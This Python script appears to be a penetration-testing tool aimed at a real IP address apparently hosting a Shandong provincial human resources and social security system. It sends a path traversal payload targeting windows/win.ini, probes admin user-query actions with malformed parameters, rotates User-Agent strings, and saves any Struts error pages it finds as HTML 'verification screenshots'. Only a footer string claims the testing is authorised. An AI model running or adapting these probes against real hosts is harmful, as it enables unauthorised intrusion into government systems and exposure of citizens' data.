import urllib.request
import urllib.error
import os
import datetime
import time

proxy_handler = urllib.request.ProxyHandler({})
opener = urllib.request.build_opener(proxy_handler)

def fetch_url_with_retry(url, max_retries=10):
    for i in range(max_retries):
        try:
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.' + str(i) + '.' + str(i*100) + ' Safari/537.36')
            req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
            req.add_header('Accept-Language', 'zh-CN,zh;q=0.9,en;q=0.8')
            req.add_header('Cache-Control', 'no-cache')
            req.add_header('Pragma', 'no-cache')
            resp = opener.open(req, timeout=15)
            body = resp.read()
            if b'Struts Problem Report' in body:
                return resp.status, dict(resp.headers.items()), body
        except urllib.error.HTTPError as e:
            body = e.read()
            if b'Struts Problem Report' in body:
                return e.code, dict(e.headers.items()), body
        except Exception as e:
            pass
        time.sleep(0.5)
    return None, None, b''

output_dir = r'e:\BaiduNetdiskDownload\1\screenshots'
os.makedirs(output_dir, exist_ok=True)

now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

test_urls = [
    # 不同的路径变体
    'http://124.128.231.226:8888/web/getTopLinksPortalCategoriesAction.action?siteId=../../../../../../../../../../windows/win.ini',
    'http://124.128.231.226:8888/web/mep-admin/userAction!queryUser.action?start=0&limit=10',
    'http://124.128.231.226:8888/web/mep-admin/userAction!queryUser.action?start=test&limit=test',
    'http://124.128.231.226:8888/web/Index.action',
    'http://124.128.231.226:8888/web/index.action',
    'http://124.128.231.226:8888/web/login.action',
    'http://124.128.231.226:8888/web/test.action',
    'http://124.128.231.226:8888/web/nonexistent.action',
    'http://124.128.231.226:8888/sdskb/web/test.action',
    'http://124.128.231.226:8888/sdosta/web/test.action',
]

found_vulns = []

for url in test_urls:
    print('Testing: ' + url)
    status, headers, body = fetch_url_with_retry(url)
    if body and b'Struts Problem Report' in body:
        print('  [FOUND] Struts Problem Report!')
        found_vulns.append({'url': url, 'status': status, 'headers': headers, 'body': body})
    else:
        print('  Not found')

print('\nFound ' + str(len(found_vulns)) + ' URLs with Struts error disclosure')

# 生成HTML页面
for idx, vuln in enumerate(found_vulns):
    name = 'vuln_' + str(idx+1)
    url = vuln['url']
    status = vuln['status']
    headers = vuln['headers']
    body = vuln['body']
    
    try:
        html = body.decode('utf-8')
    except:
        try:
            html = body.decode('gbk')
        except:
            html = body.decode('utf-8', errors='replace')
    
    server = headers.get('Server', 'N/A') if headers else 'N/A'
    
    status_color = '#dc3545'
    status_text = '存在Java错误信息泄露 (中危)'
    
    full_html = '<!DOCTYPE html>\n<html>\n<head>\n    <meta charset="utf-8">\n    <title>Java错误信息泄露漏洞验证 - ' + str(idx+1) + '</title>\n    <style>\n        * { margin: 0; padding: 0; box-sizing: border-box; }\n        body {\n            font-family: "Microsoft YaHei", "Segoe UI", Arial, sans-serif;\n            background-color: #f0f2f5;\n            color: #333;\n            line-height: 1.6;\n        }\n        .header {\n            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n            color: white;\n            padding: 20px 30px;\n        }\n        .header h1 {\n            font-size: 20px;\n            margin-bottom: 8px;\n        }\n        .header .system-name {\n            font-size: 14px;\n            opacity: 0.9;\n        }\n        .url-bar {\n            background-color: #fff;\n            border-bottom: 1px solid #e8e8e8;\n            padding: 12px 30px;\n            display: flex;\n            align-items: center;\n            gap: 12px;\n        }\n        .url-label {\n            background-color: #e8f4fd;\n            color: #1890ff;\n            padding: 4px 12px;\n            border-radius: 4px;\n            font-size: 13px;\n            font-weight: 500;\n            white-space: nowrap;\n        }\n        .url-value {\n            font-family: Consolas, Monaco, monospace;\n            font-size: 13px;\n            color: #555;\n            word-break: break-all;\n            flex: 1;\n        }\n        .info-bar {\n            background-color: #fff;\n            border-bottom: 1px solid #e8e8e8;\n            padding: 10px 30px;\n            display: flex;\n            gap: 30px;\n            font-size: 13px;\n            flex-wrap: wrap;\n        }\n        .info-item {\n            display: flex;\n            align-items: center;\n            gap: 8px;\n        }\n        .info-label {\n            color: #888;\n        }\n        .info-value {\n            color: #333;\n            font-weight: 500;\n        }\n        .status-badge {\n            display: inline-block;\n            padding: 4px 12px;\n            border-radius: 4px;\n            color: white;\n            font-weight: 600;\n            font-size: 12px;\n            background-color: ' + status_color + ';\n        }\n        .content {\n            padding: 20px 30px;\n        }\n        .content-frame {\n            background-color: #fff;\n            border: 1px solid #e8e8e8;\n            border-radius: 8px;\n            padding: 25px;\n            min-height: 400px;\n            box-shadow: 0 2px 8px rgba(0,0,0,0.05);\n            overflow: auto;\n        }\n        .footer {\n            text-align: center;\n            padding: 15px;\n            color: #999;\n            font-size: 12px;\n        }\n    </style>\n</head>\n<body>\n    <div class="header">\n        <h1>Java错误信息泄露漏洞验证 - ' + str(idx+1) + '</h1>\n        <div class="system-name">山东省人力资源和社会保障厅相关系统</div>\n    </div>\n    <div class="url-bar">\n        <span class="url-label">访问URL</span>\n        <span class="url-value">' + url + '</span>\n    </div>\n    <div class="info-bar">\n        <div class="info-item">\n            <span class="info-label">验证状态:</span>\n            <span class="status-badge">' + status_text + '</span>\n        </div>\n        <div class="info-item">\n            <span class="info-label">HTTP状态:</span>\n            <span class="info-value">' + str(status) + '</span>\n        </div>\n        <div class="info-item">\n            <span class="info-label">服务器:</span>\n            <span class="info-value">' + server + '</span>\n        </div>\n        <div class="info-item">\n            <span class="info-label">验证时间:</span>\n            <span class="info-value">' + now + '</span>\n        </div>\n    </div>\n    <div class="content">\n        <div class="content-frame">\n' + html + '\n        </div>\n    </div>\n    <div class="footer">\n        安全漏洞验证截图 - 仅用于授权安全测试\n    </div>\n</body>\n</html>'
    
    filepath = os.path.join(output_dir, name + '.html')
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(full_html)
    print('Saved: ' + filepath)

print('\nDone!')
